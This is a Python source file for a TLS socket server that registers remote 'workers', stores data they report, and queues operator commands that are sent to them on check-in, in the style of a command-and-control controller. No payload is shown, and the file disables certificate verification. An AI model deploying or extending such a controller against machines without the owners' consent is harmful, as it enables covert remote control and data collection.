import json
import os
import socket
import ssl
import sys
from dataclasses import asdict
from datetime import datetime
from threading import Thread

from DataToObject.ServerCommand import ServerCommand
from DataToObject.WorkerRegistered import WorkerRegistered
from DataToObject.WorkerResult import WorkerResult
from DataToObject.WorkerResultCommand import WorkerResultCommand
from Utils.DictToDataclass import dict_to_dataclass
from Utils.ObjectSerialization import data_to_base64_json_encoded_bytes, bytes_to_object
from Utils.ReceiveAll import socket_receive_all

# ------------ GLOBAL INITS
socket.setdefaulttimeout(5)

pwd = os.path.dirname(os.path.abspath(__file__))
data_json_path = os.path.join(pwd, 'data.json')


workers: dict[str, WorkerRegistered] = {}
thread_working = True

try:
    if os.path.exists(data_json_path):
        with open(data_json_path, 'r') as file:
            data_json = file.read()
            tmp_data: dict = json.loads(data_json)
            for key, item in tmp_data.items():
                workers[key] = dict_to_dataclass(WorkerResult, item)
        print('Successfully loaded data.json !')
except Exception as e:
    print('Detected data.json file but could not load data from it')
    print(e)

ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ssl_context.load_cert_chain(
    certfile=os.path.join(pwd, '.ssh', 'rootCA.pem'), 
    keyfile=os.path.join(pwd, '.ssh', 'rootCA.key')
)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 55612))
sock.listen()


# ------------ FUNCTIONS
def print_recap() -> None:
    global workers

    print('\n---------\n')

    if len(workers) == 0:
        print('Aucun worker')

    for uuid, worker in workers.items():
        print("Worker: " + str(uuid))
        print('\tCreation: ' + str(worker.created_at))
        print('\tLast ping: ' + str(worker.last_ping_at))
        print('\tLast known address: ' + str(worker.last_known_address))
        print('\tConnexions count: ' + str(worker.connexions_count))
    
    print('\n---------\n')

def thread_listen() -> None:
    global thread_working, sock, ssl_context

    while thread_working:
        try: 
            worker_sock, worker_address = sock.accept()
            with ssl_context.wrap_socket(worker_sock, server_side=True) as secure_conn:
                handle_worker(secure_conn, worker_address)
        except socket.timeout:
            pass

def is_worker_registered(identifier: str) -> bool:
    global workers
    return identifier not in workers.keys()

def register_new_worker(worker_result: WorkerResult, worker_address: any) -> None:
    worker_registered = WorkerRegistered()
    worker_registered.created_at = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
    worker_registered.connexions_count = 0
    worker_registered.last_known_address = worker_address

    workers[worker_result.identifier] = worker_registered

def handle_worker(worker_sock: socket.socket, worker_address: any) -> None:
    global workers

    try:
        print("\nReceived data from " + str(worker_address))

        data = socket_receive_all(worker_sock)
        worker_result: WorkerResult = bytes_to_object(data, WorkerResult)
        print("Deserialized data of worker " + str(worker_address) + '\n')


        if is_worker_registered(worker_result.identifier):
            register_new_worker(worker_result, worker_address)

        worker = workers.get(worker_result.identifier)
        worker.last_ping_at = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        worker.connexions_count += 1
        worker.collected_data.append(worker_result)

        send_command_from_queue(worker_sock, worker_result.identifier)
        worker_sock.close()

        print('> ', end='')
        sys.stdout.flush()
    except Exception as e:
        print(e)

def add_command_to_queue(worker_identifier: str, command: str, data: str = '') -> bool:
    global workers

    worker = workers.get(worker_identifier)
    if not worker:
        return False

    server_command = ServerCommand()
    server_command.command = command
    server_command.data = data
    print(server_command)
    worker.command_queue.append(server_command)

    return True

def send_command_from_queue(worker_sock: socket.socket, worker_identifier: str) -> None:
    global workers

    worker = workers.get(worker_identifier)
    
    if len(worker.command_queue) == 0:
        return
    
    command = worker.command_queue.pop(0)

    data = data_to_base64_json_encoded_bytes(command)
    worker_sock.send(data)
    print('Command ' + command.command + ' sent to worker ' + worker_identifier + '\n')

    result_data = socket_receive_all(worker_sock)
    result: WorkerResultCommand = bytes_to_object(result_data, WorkerResultCommand)
    worker.command_results.append(result)
    print(f'Command result from worker {worker_identifier}: {result}')

def command_cmd(command: str) -> None:
    try:
        split = command.split(' ')
        worker_identifier = split[1]
        to_exec = split[2]
        data_array = []
        for i in range(3, len(split)):
            data_array.append(split[i])
        data = ' '.join(data_array)


        if to_exec not in ServerCommand.ALL:
            raise ValueError()

        if not add_command_to_queue(worker_identifier, to_exec, data):
            print('Unknown worker identifier ' + worker_identifier + '\n')
            return

        print('Command added to queue.\n')
    except (ValueError, IndexError):
        print('Invalid syntax')
        print('Available commands:')
        for serverCommand in ServerCommand.ALL:
            print('\t' + serverCommand)
        print('Example: "cmd 7f8fd662-eaa1-4315-8941-100671cb0764 ping google.com"')

def exit(thread: Thread) -> None:
    global thread_working, pwd
    thread_working = False
    print('Exiting...')
    thread.join(5000)
    sock.close()

# ------------ PROGRAM
def main() -> None:
    global sock, workers

    thread = Thread(target=thread_listen)
    thread.start()

    while True:
        command = input('> ')

        if command == 'exit':
            exit(thread)
            break
        elif command == 'r':
            print_recap()
        elif command == 'queue':
            print("Queue:")
            for uuid, worker in workers.items():
                if len(worker.command_queue) > 0:
                    print('\t' + uuid)
                    for command in worker.command_queue:
                        print('\t\t' + command.command + ' ' + command.data)
        elif command.startswith('cmd'):
            command_cmd(command)
        else:
            print('Available commands:\n\t'
                  '"r" for a recap/list of clients\n\t'
                  '"exit"\n\t'
                  '"cmd <worker uuid> <command>" (run only "cmd" to get help)\n\t'
                  '"queue" to list waiting commands')

    sock.close()

    try:
        with open(os.path.join(pwd, 'data.json'), 'w') as file:
            tmp_data = {}
            for uuid, worker in workers.items():
                tmp_data[uuid] = asdict(worker)
            file.write(json.dumps(tmp_data))
    except Exception as e:
        print('Could not persist to data.json')
        print(e)

if __name__ == "__main__":
    main()
